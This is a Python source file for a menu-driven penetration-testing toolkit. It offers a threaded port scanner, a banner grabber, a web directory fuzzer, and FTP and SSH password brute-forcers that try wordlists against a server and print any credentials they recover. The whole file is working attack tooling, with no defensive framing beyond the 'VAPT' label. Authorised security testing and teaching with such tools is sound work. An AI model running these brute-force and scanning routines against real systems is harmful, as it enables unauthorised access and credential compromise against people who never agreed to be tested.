import socket
import ftplib
import paramiko
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

# --------- Banner ---------

def print_banner():
    RED = "\033[91m"
    GREEN = "\033[92m"
    CYAN = "\033[96m"
    YELLOW = "\033[93m"
    MAGENTA = "\033[95m"
    BLUE = "\033[94m"
    RESET = "\033[0m"

    banner = f"""
V     V   AAAAA  PPPPP   TTTTT
V     V   A   A  P   P     T  
 V   V    AAAAA  PPPPP     T  
  V V     A   A  P         T  
   V      A   A  P         T

{YELLOW}           VAPT TOOLKIT {GREEN}➜{YELLOW} Code by {CYAN}Mansi Gharat {YELLOW}➜ Version {GREEN}1.0{RESET}
"""
    print(banner)


# --------- Port Scanner ---------

import socket
import threading
from queue import Queue

# ANSI color codes
GREEN = "\033[92m"
RED = "\033[91m"
RESET = "\033[0m"

def port_scan_worker(target, port_queue, open_ports):
    while not port_queue.empty():
        port = port_queue.get()
        try:
            sock = socket.socket()
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            if result == 0:
                print(f"{GREEN}[OPEN] Port {port}{RESET}")
                open_ports.append(port)
            else:
                print(f"{RED}[CLOSED] Port {port}{RESET}")
            sock.close()
        except Exception:
            print(f"{RED}[ERROR] Port {port}{RESET}")
        port_queue.task_done()

def port_scanner():
    target = input("Enter target IP or domain: ").strip()
    port_range = input("Enter port range to scan (e.g., 20-80): ").strip()
    
    # Validate port range input
    try:
        start_port, end_port = map(int, port_range.split('-'))
        if not (0 < start_port < 65536 and 0 < end_port < 65536 and start_port <= end_port):
            print(f"{RED}Invalid port range. Ports must be between 1 and 65535.{RESET}")
            return
    except ValueError:
        print(f"{RED}Invalid input format. Use 'start-end' format for ports.{RESET}")
        return

    print(f"Scanning ports from {start_port} to {end_port} on {target}...\n")

    port_queue = Queue()
    open_ports = []

    # Fill queue with ports
    for port in range(start_port, end_port + 1):
        port_queue.put(port)

    # Start threads
    thread_count = min(100, end_port - start_port + 1)  # max 100 threads or less
    threads = []
    for _ in range(thread_count):
        t = threading.Thread(target=port_scan_worker, args=(target, port_queue, open_ports))
        t.daemon = True
        t.start()
        threads.append(t)

    port_queue.join()

    print("\nScan completed.")
    if open_ports:
        print(f"{GREEN}Open ports: {', '.join(map(str, open_ports))}{RESET}")
    else:
        print(f"{RED}No open ports found in the specified range.{RESET}")



# --------- Banner Grabber (Your version) ---------
def banner_grab():
    ip = input("Enter target IP or domain: ")
    port = int(input("Enter port (e.g., 21, 22, 80): "))
    try:
        if port == 80 or port == 443:
            url = f"http://{ip}" if port == 80 else f"https://{ip}"
            response = requests.get(url)
            print("[+] HTTP Headers:")
            for k, v in response.headers.items():
                print(f"{k}: {v}")
        else:
            sock = socket.socket()
            sock.settimeout(2)
            sock.connect((ip, port))
            banner = sock.recv(1024).decode().strip()
            print(f"[+] Banner from {ip}:{port} ➜ {banner}")
            sock.close()
    except Exception as e:
        print(f"[-] Failed to grab banner: {e}")

# --------- FTP Brute Force ---------
def ftp_brute_force(host, usernames, wordlist_path):
    try:
        with open(wordlist_path, 'r', errors='ignore') as file:
            passwords = [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        print("[-] Wordlist file not found!")
        return

    for username in usernames:
        for password in passwords:
            try:
                ftp = ftplib.FTP(host, timeout=5)
                ftp.login(user=username, passwd=password)
                print(f"\033[92m[+] Success: {username}:{password}\033[0m")
                ftp.quit()
                return
            except ftplib.error_perm:
                print(f"[-] Failed: {username}:{password}")
            except Exception as e:
                print(f"[-] Error: {e}")
                return

# --------- SSH Brute Force ---------
def ssh_brute_force(host, port, usernames, wordlist_path):
    try:
        with open(wordlist_path, 'r', errors='ignore') as file:
            passwords = [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        print("[-] Wordlist file not found!")
        return

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for username in usernames:
        for password in passwords:
            try:
                client.connect(hostname=host, port=port, username=username, password=password, timeout=5)
                print(f"\033[92m[+] Success: {username}:{password}\033[0m")
                client.close()
                return
            except paramiko.AuthenticationException:
                print(f"[-] Failed: {username}:{password}")
            except paramiko.SSHException as sshException:
                print(f"[-] SSH error: {sshException}")
                return
            except Exception as e:
                print(f"[-] Error: {e}")
                return
    client.close()

# --------- Directory Fuzzer ---------
def check_url(url):
    try:
        response = requests.get(url, timeout=5, allow_redirects=False)
        status = response.status_code
        if status == 200:
            return (url, status, "FOUND", None)
        elif status in (301, 302, 303, 307, 308):
            return (url, status, "REDIRECT", response.headers.get('Location'))
        elif status == 403:
            return (url, status, "FORBIDDEN", None)
        else:
            return None
    except requests.RequestException:
        return None

def directory_fuzzer(base_url, wordlist_path):
    try:
        with open(wordlist_path, 'r', errors='ignore') as file:
            paths = [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        print("[-] Wordlist file not found!")
        return

    urls = [base_url.rstrip('/') + '/' + path for path in paths]

    results = []
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = {executor.submit(check_url, url): url for url in urls}

        for future in as_completed(futures):
            res = future.result()
            if res:
                url, status, status_text, redirect_location = res
                if redirect_location:
                    print(f"[{status_text}] {url} - Status: {status} -> {redirect_location}")
                else:
                    print(f"[{status_text}] {url} - Status: {status}")
                results.append(res)

    print("\n--- Scan Summary ---")
    for url, status, status_text, redirect_location in results:
        if redirect_location:
            print(f"{status_text}: {url} - Status: {status} -> {redirect_location}")
        else:
            print(f"{status_text}: {url} - Status: {status}")

    with open('directory_fuzz_report.txt', 'w') as f:
        for url, status, status_text, redirect_location in results:
            if redirect_location:
                f.write(f"{status_text}: {url} - Status: {status} -> {redirect_location}\n")
            else:
                f.write(f"{status_text}: {url} - Status: {status}\n")

    print("\nReport saved as directory_fuzz_report.txt")

# --------- Helper to get usernames list ----------
def get_usernames():
    choice = input("Do you want to use a single username or a list? (s/l): ").strip().lower()
    if choice == 's':
        username = input("Enter username: ").strip()
        return [username]
    elif choice == 'l':
        path = input("Enter path to username list file: ").strip()
        try:
            with open(path, 'r', errors='ignore') as f:
                usernames = [line.strip() for line in f.readlines()]
            return usernames
        except FileNotFoundError:
            print("[-] Username list file not found!")
            return []
    else:
        print("Invalid option selected.")
        return []

# --------- Main Menu ---------
def main():
    print_banner()
    while True:
        print("""
=== Penetration Testing Toolkit ===
1. Port Scanner
2. Banner Grabber
3. FTP Bruteforce Tool
4. Directory Fuzzer
5. SSH Bruteforce Tool
6. Exit
""")
        choice = input("Select an option (1-6): ").strip()

        if choice == '1':
            port_scanner()

        elif choice == '2':
            banner_grab()

        elif choice == '3':
            host = input("Enter FTP server IP/Domain: ").strip()
            usernames = get_usernames()
            if not usernames:
                continue
            wordlist_path = input("Enter path to password wordlist: ").strip()
            ftp_brute_force(host, usernames, wordlist_path)

        elif choice == '4':
            base_url = input("Enter base URL (e.g., http://testphp.vulnweb.com): ").strip()
            wordlist_path = input("Enter path to wordlist (e.g., dirwordlist.txt): ").strip()
            directory_fuzzer(base_url, wordlist_path)

        elif choice == '5':
            host = input("Enter SSH server IP/Domain: ").strip()
            port_input = input("Enter SSH port (default 22): ").strip()
            port = int(port_input) if port_input else 22
            usernames = get_usernames()
            if not usernames:
                continue
            wordlist_path = input("Enter path to password wordlist: ").strip()
            ssh_brute_force(host, port, usernames, wordlist_path)

        elif choice == '6':
            print("Exiting toolkit.")
            break

        else:
            print("Invalid option. Please select a number between 1 and 6.")

if __name__ == "__main__":
    main()
